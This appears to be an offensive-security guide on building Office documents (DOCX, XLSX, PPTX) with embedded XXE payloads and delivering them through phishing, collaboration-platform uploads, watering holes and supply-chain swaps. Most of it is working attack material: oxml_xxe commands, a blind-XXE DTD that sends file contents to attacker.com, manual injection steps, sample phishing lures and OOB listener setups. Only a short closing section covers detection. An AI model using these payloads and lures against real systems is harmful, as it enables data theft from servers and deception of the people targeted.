# OOXML XXE Social Engineering Guide

> Companion to `skills/web-xxe/SKILL.md`. This guide covers weaponized Office documents with embedded XXE payloads using oxml_xxe, combining with social engineering delivery vectors.

---

## 1. Introduction

Office documents (DOCX, XLSX, PPTX) use the Office Open XML (OOXML) format internally -- a collection of XML files wrapped in a ZIP archive. When a server-side application processes uploaded Office documents (document management systems, collaboration platforms, antivirus engines, email gateways, data import pipelines), it parses these XML files. If the XML parser has external entity resolution enabled, an attacker can inject XXE payloads into the document's XML structure. Combined with social engineering delivery (phishing emails, shared documents, malicious attachments), this creates a powerful attack vector that exploits human trust to trigger server-side XML vulnerabilities.

---

## 2. Understanding OOXML Structure

An Office document is a ZIP archive containing multiple XML files with a defined directory structure. The key files for XXE injection are:

- **`[Content_Types].xml`** -- Maps file extensions and specific files to MIME types. Processed first when the document is opened.
- **`word/document.xml`** (DOCX) / **`xl/sharedStrings.xml`** (XLSX) / **`ppt/presentation.xml`** (PPTX) -- Contains the main document content.
- **`_rels/.rels`** -- Defines relationships between document parts.

Each of these XML files is parsed independently by the document processing library. Injecting a DOCTYPE declaration with external entity definitions into any of them creates an XXE vector.

```bash
# Explore OOXML structure
unzip -l template.docx
# Archive:  template.docx
#   [Content_Types].xml
#   _rels/.rels
#   word/document.xml
#   word/_rels/document.xml.rels
#   word/styles.xml
#   word/fontTable.xml
#   word/settings.xml
#   docProps/core.xml
#   docProps/app.xml
```

---

## 3. Weaponizing with oxml_xxe

oxml_xxe automates the process of injecting XXE payloads into Office documents. It handles unzipping, XML modification, and re-zipping while preserving the document's legitimate structure so it opens normally in Office applications.

### 3.1 Basic DOCX XXE Injection

```bash
# Create a simple XXE payload file
cat > xxe_payload.txt << 'EOF'
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/ooxml-callback">]>
EOF

# Inject payload into DOCX
python3 oxml_xxe.py --file template.docx --inject \
  --payload-file xxe_payload.txt \
  --output malicious.docx

# The tool injects the DOCTYPE into word/document.xml
# The document remains valid and opens normally
```

### 3.2 Blind XXE with OOB Exfiltration

For targets where the server processes documents but does not return parsed content, use blind XXE payloads that exfiltrate data through OOB channels.

```bash
# Create a DTD file for blind XXE
cat > blind.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?d=%file;'>">
%eval;
%send;
EOF

# Create payload that loads the remote DTD
cat > blind_payload.txt << 'EOF'
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/blind.dtd">%dtd;]>
EOF

# Inject into DOCX
python3 oxml_xxe.py --file template.docx --inject \
  --payload-file blind_payload.txt \
  --output malicious.docx
```

### 3.3 XLSX and PPTX Variants

Spreadsheet and presentation formats use different XML structures but follow the same injection principle.

```bash
# XLSX injection -- payload goes into xl/sharedStrings.xml
python3 oxml_xxe.py --file quarterly_report.xlsx --inject \
  --payload '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xlsx-xxe">]>' \
  --output Q4_2025_report.xlsx

# PPTX injection -- payload goes into ppt/presentation.xml
python3 oxml_xxe.py --file company_presentation.pptx --inject \
  --payload '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/pptx-xxe">]>' \
  --output All_Hands_Meeting.pptx
```

---

## 4. Manual OOXML XXE Construction

When oxml_xxe is unavailable or you need fine-grained control over which XML file receives the payload, construct the malicious document manually.

### 4.1 Step-by-Step Manual Injection

```bash
# Step 1: Unzip the legitimate document
mkdir -p /tmp/docx_work && cd /tmp/docx_work
unzip /path/to/template.docx

# Step 2: Identify the target XML file
# word/document.xml for DOCX body content
# xl/sharedStrings.xml for XLSX cell strings
# ppt/slides/slide1.xml for PPTX slide content

# Step 3: Inject DOCTYPE into the target XML
# Add the DOCTYPE declaration immediately after the XML declaration
head -1 word/document.xml
# <?xml version="1.0" encoding="UTF-8" standalone="yes"?>

# Insert DOCTYPE after the XML declaration
sed '2i <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/manual-xxe">]>' \
  word/document.xml > word/document_mod.xml
mv word/document_mod.xml word/document.xml

# Step 4: Reference the entity in the document body
# Find a <w:t> element and replace its content with &xxe;
sed -i 's/<w:t>[^<]*<\/w:t>/<w:t>\&xxe;<\/w:t>/' word/document.xml

# Step 5: Re-zip the document
zip -r /tmp/malicious.docx . -x "*.DS_Store"

# Step 6: Verify the document structure
unzip -l /tmp/malicious.docx
```

### 4.2 [Content_Types].xml Injection

The `[Content_Types].xml` file is processed early in document parsing, making it an effective injection target. Some document processing libraries parse this file before any content XML.

```bash
# Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/content-types.dtd">
  %dtd;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
XMLEOF

# Re-zip
zip -r malicious.docx . -x "*.DS_Store"
```

---

## 5. Social Engineering Delivery Vectors

The weaponized document is only effective if it reaches a target system that processes it server-side. Social engineering techniques increase the likelihood of successful delivery.

### 5.1 Email Attachment Delivery

Craft a phishing email that encourages the recipient to upload the document to a target system. Effective lures include:

- **Invoice or purchase order** (XLSX) -- "Please verify the charges in the attached invoice by uploading it to our billing portal."
- **Resume or job application** (DOCX) -- "I am applying for the open position; please find my resume attached."
- **Quarterly report** (XLSX) -- "The Q4 financial report is attached for review in the document management system."
- **Meeting presentation** (PPTX) -- "Slides from the all-hands meeting for upload to the shared drive."

### 5.2 Collaboration Platform Delivery

Upload the weaponized document directly to collaboration platforms (SharePoint, Google Drive, Confluence) that automatically process uploaded files for indexing, preview generation, or malware scanning. These server-side processing pipelines often parse XML with vulnerable configurations.

```bash
# Upload to SharePoint document library
curl -X POST "https://target.sharepoint.com/sites/documents/_api/web/GetFolderByServerRelativeUrl('/sites/documents/shared')/Files/add(url='report.docx',overwrite=true)" \
  -H "Authorization: Bearer $SHAREPOINT_TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malicious.docx

# Upload to Confluence via REST API
curl -X POST "https://target.atlassian.net/wiki/rest/api/content/12345/child/attachment" \
  -H "Authorization: Bearer $CONFLUENCE_TOKEN" \
  -H "X-Atlassian-Token: no-check" \
  -F "file=@malicious.docx" \
  -F "comment=Updated report"
```

### 5.3 Watering Hole and Document Sharing

Upload weaponized documents to public document repositories, industry-specific portals, or file-sharing services where targets are likely to download and process them. Use filenames that match the context: industry reports, compliance templates, technical specifications.

### 5.4 Supply Chain Injection

If the attacker can compromise a trusted document source (vendor portal, template repository, shared network drive), replacing legitimate documents with weaponized versions ensures wide distribution without direct social engineering.

---

## 6. Monitoring and Impact Validation

Set up comprehensive OOB monitoring to capture all interactions triggered by the weaponized document:

```bash
# Multi-channel OOB listener
# Terminal 1: HTTP listener
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[HTTP] {self.client_address[0]} -> {self.path}')
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 80), H).serve_forever()
"

# Terminal 2: FTP listener
nc -lvnp 2121

# Terminal 3: DNS monitor (using interactsh)
interactsh-client -v
```

Document all received callbacks with source IP, timestamp, and exfiltrated content. For engagement reporting, correlate callbacks with the specific document uploaded and the time of upload to prove the attack chain from social engineering delivery to data exfiltration.

---

## 7. Detection Considerations for Defenders

Defenders should inspect Office documents for DOCTYPE declarations and external entity references before server-side processing. OOXML specification-compliant documents should not contain DOCTYPE declarations in any of their XML components. Automated document scanning should reject any Office document containing `<!DOCTYPE`, `<!ENTITY`, or `SYSTEM` keywords in its embedded XML files.

---

## References

- oxml_xxe Tool: https://github.com/BuffaloWill/oxml_xxe
- OOXML Specification (ECMA-376): https://www.ecma-international.org/publications-and-standards/standards/ecma-376/
- PortSwigger XXE via File Upload: https://portswigger.net/web-security/xxe
- MITRE ATT&CK - Phishing with Malicious File (T1566.001): https://attack.mitre.org/techniques/T1566/001/
- Microsoft - OOXML Security: https://learn.microsoft.com/en-us/openspecs/officestandards/
